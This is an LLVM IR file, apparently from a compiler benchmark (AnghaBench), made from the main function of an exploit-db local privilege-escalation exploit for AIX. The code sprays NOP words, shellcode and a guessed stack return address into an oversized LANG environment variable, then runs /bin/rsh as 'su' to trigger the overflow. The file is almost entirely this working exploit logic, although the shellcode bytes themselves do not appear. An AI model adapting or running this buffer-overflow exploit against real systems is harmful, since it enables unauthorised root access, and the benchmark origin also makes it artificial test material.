; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_19215.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_19215.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [6 x i8] c"LANG=\00", align 1
@x = common dso_local global i8* null, align 8
@i = common dso_local global i64 0, align 8
@ADJUST = common dso_local global i64 0, align 8
@NOP = common dso_local global i32 0, align 4
@exploit_code = common dso_local global i8* null, align 8
@STARTADR = common dso_local global i64 0, align 8
@ret_adr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [37 x i8] c"jumping address : %lx,  offset = %d\0A\00", align 1
@.str.2 = private unnamed_addr constant [27 x i8] c"New jumping address : %lx\0A\00", align 1
@RETS = common dso_local global i64 0, align 8
@EV = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [9 x i8] c"/bin/rsh\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"su\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %7 = call i32 @putenv(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))
  %8 = load i8*, i8** @x, align 8
  %9 = call i32 @memset(i8* %8, i8 signext 120, i32 70000)
  %10 = load i32, i32* %4, align 4
  %11 = icmp eq i32 %10, 2
  br i1 %11, label %12, label %17

12:                                               ; preds = %2
  %13 = load i8**, i8*** %5, align 8
  %14 = getelementptr inbounds i8*, i8** %13, i64 1
  %15 = load i8*, i8** %14, align 8
  %16 = call i32 @atoi(i8* %15)
  store i32 %16, i32* %6, align 4
  br label %18

17:                                               ; preds = %2
  store i32 5392, i32* %6, align 4
  br label %18

18:                                               ; preds = %17, %12
  store i64 0, i64* @i, align 8
  br label %19

19:                                               ; preds = %27, %18
  %20 = load i64, i64* @i, align 8
  %21 = load i64, i64* @ADJUST, align 8
  %22 = icmp ult i64 %20, %21
  br i1 %22, label %23, label %30

23:                                               ; preds = %19
  %24 = load i8*, i8** @x, align 8
  %25 = load i64, i64* @i, align 8
  %26 = getelementptr inbounds i8, i8* %24, i64 %25
  store i8 64, i8* %26, align 1
  br label %27

27:                                               ; preds = %23
  %28 = load i64, i64* @i, align 8
  %29 = add i64 %28, 1
  store i64 %29, i64* @i, align 8
  br label %19

30:                                               ; preds = %19
  %31 = load i64, i64* @ADJUST, align 8
  store i64 %31, i64* @i, align 8
  br label %32

32:                                               ; preds = %67, %30
  %33 = load i64, i64* @i, align 8
  %34 = icmp ult i64 %33, 1000
  br i1 %34, label %35, label %70

35:                                               ; preds = %32
  %36 = load i32, i32* @NOP, align 4
  %37 = and i32 %36, 255
  %38 = trunc i32 %37 to i8
  %39 = load i8*, i8** @x, align 8
  %40 = load i64, i64* @i, align 8
  %41 = add i64 %40, 3
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  store i8 %38, i8* %42, align 1
  %43 = load i32, i32* @NOP, align 4
  %44 = ashr i32 %43, 8
  %45 = and i32 %44, 255
  %46 = trunc i32 %45 to i8
  %47 = load i8*, i8** @x, align 8
  %48 = load i64, i64* @i, align 8
  %49 = add i64 %48, 2
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  store i8 %46, i8* %50, align 1
  %51 = load i32, i32* @NOP, align 4
  %52 = ashr i32 %51, 16
  %53 = and i32 %52, 255
  %54 = trunc i32 %53 to i8
  %55 = load i8*, i8** @x, align 8
  %56 = load i64, i64* @i, align 8
  %57 = add i64 %56, 1
  %58 = getelementptr inbounds i8, i8* %55, i64 %57
  store i8 %54, i8* %58, align 1
  %59 = load i32, i32* @NOP, align 4
  %60 = ashr i32 %59, 24
  %61 = and i32 %60, 255
  %62 = trunc i32 %61 to i8
  %63 = load i8*, i8** @x, align 8
  %64 = load i64, i64* @i, align 8
  %65 = add i64 %64, 0
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  store i8 %62, i8* %66, align 1
  br label %67

67:                                               ; preds = %35
  %68 = load i64, i64* @i, align 8
  %69 = add i64 %68, 4
  store i64 %69, i64* @i, align 8
  br label %32

70:                                               ; preds = %32
  store i64 0, i64* @i, align 8
  br label %71

71:                                               ; preds = %88, %70
  %72 = load i64, i64* @i, align 8
  %73 = load i8*, i8** @exploit_code, align 8
  %74 = call i64 @strlen(i8* %73)
  %75 = icmp ult i64 %72, %74
  br i1 %75, label %76, label %91

76:                                               ; preds = %71
  %77 = load i8*, i8** @exploit_code, align 8
  %78 = load i64, i64* @i, align 8
  %79 = getelementptr inbounds i8, i8* %77, i64 %78
  %80 = load i8, i8* %79, align 1
  %81 = load i8*, i8** @x, align 8
  %82 = load i64, i64* @STARTADR, align 8
  %83 = load i64, i64* @i, align 8
  %84 = add i64 %82, %83
  %85 = load i64, i64* @ADJUST, align 8
  %86 = add i64 %84, %85
  %87 = getelementptr inbounds i8, i8* %81, i64 %86
  store i8 %80, i8* %87, align 1
  br label %88

88:                                               ; preds = %76
  %89 = load i64, i64* @i, align 8
  %90 = add i64 %89, 1
  store i64 %90, i64* @i, align 8
  br label %71

91:                                               ; preds = %71
  %92 = call i32 (...) @get_sp()
  %93 = load i32, i32* %6, align 4
  %94 = sub nsw i32 %92, %93
  store i32 %94, i32* @ret_adr, align 4
  %95 = load i32, i32* @ret_adr, align 4
  %96 = load i32, i32* %6, align 4
  %97 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.1, i64 0, i64 0), i32 %95, i32 %96)
  %98 = load i32, i32* @ret_adr, align 4
  %99 = and i32 %98, 255
  %100 = icmp eq i32 %99, 0
  br i1 %100, label %101, label %106

101:                                              ; preds = %91
  %102 = load i32, i32* @ret_adr, align 4
  %103 = sub nsw i32 %102, 16
  store i32 %103, i32* @ret_adr, align 4
  %104 = load i32, i32* @ret_adr, align 4
  %105 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.2, i64 0, i64 0), i32 %104)
  br label %106

106:                                              ; preds = %101, %91
  %107 = load i64, i64* @ADJUST, align 8
  %108 = load i64, i64* @RETS, align 8
  %109 = add i64 %107, %108
  store i64 %109, i64* @i, align 8
  br label %110

110:                                              ; preds = %147, %106
  %111 = load i64, i64* @i, align 8
  %112 = load i64, i64* @RETS, align 8
  %113 = add i64 %112, 600
  %114 = icmp ult i64 %111, %113
  br i1 %114, label %115, label %150

115:                                              ; preds = %110
  %116 = load i32, i32* @ret_adr, align 4
  %117 = and i32 %116, 255
  %118 = trunc i32 %117 to i8
  %119 = load i8*, i8** @x, align 8
  %120 = load i64, i64* @i, align 8
  %121 = add i64 %120, 3
  %122 = getelementptr inbounds i8, i8* %119, i64 %121
  store i8 %118, i8* %122, align 1
  %123 = load i32, i32* @ret_adr, align 4
  %124 = ashr i32 %123, 8
  %125 = and i32 %124, 255
  %126 = trunc i32 %125 to i8
  %127 = load i8*, i8** @x, align 8
  %128 = load i64, i64* @i, align 8
  %129 = add i64 %128, 2
  %130 = getelementptr inbounds i8, i8* %127, i64 %129
  store i8 %126, i8* %130, align 1
  %131 = load i32, i32* @ret_adr, align 4
  %132 = ashr i32 %131, 16
  %133 = and i32 %132, 255
  %134 = trunc i32 %133 to i8
  %135 = load i8*, i8** @x, align 8
  %136 = load i64, i64* @i, align 8
  %137 = add i64 %136, 1
  %138 = getelementptr inbounds i8, i8* %135, i64 %137
  store i8 %134, i8* %138, align 1
  %139 = load i32, i32* @ret_adr, align 4
  %140 = ashr i32 %139, 24
  %141 = and i32 %140, 255
  %142 = trunc i32 %141 to i8
  %143 = load i8*, i8** @x, align 8
  %144 = load i64, i64* @i, align 8
  %145 = add i64 %144, 0
  %146 = getelementptr inbounds i8, i8* %143, i64 %145
  store i8 %142, i8* %146, align 1
  br label %147

147:                                              ; preds = %115
  %148 = load i64, i64* @i, align 8
  %149 = add i64 %148, 4
  store i64 %149, i64* @i, align 8
  br label %110

150:                                              ; preds = %110
  %151 = load i8*, i8** @x, align 8
  %152 = load i8*, i8** @EV, align 8
  %153 = load i8*, i8** @EV, align 8
  %154 = call i64 @strlen(i8* %153)
  %155 = call i32 @memcpy(i8* %151, i8* %152, i64 %154)
  %156 = load i8*, i8** @x, align 8
  %157 = getelementptr inbounds i8, i8* %156, i64 3000
  store i8 0, i8* %157, align 1
  %158 = load i8*, i8** @x, align 8
  %159 = call i32 @putenv(i8* %158)
  %160 = call i32 @execl(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8* null)
  %161 = load i32, i32* %3, align 4
  ret i32 %161
}

declare dso_local i32 @putenv(i8*) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i64 @strlen(i8*) #1

declare dso_local i32 @get_sp(...) #1

declare dso_local i32 @printf(i8*, i32, ...) #1

declare dso_local i32 @memcpy(i8*, i8*, i64) #1

declare dso_local i32 @execl(i8*, i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
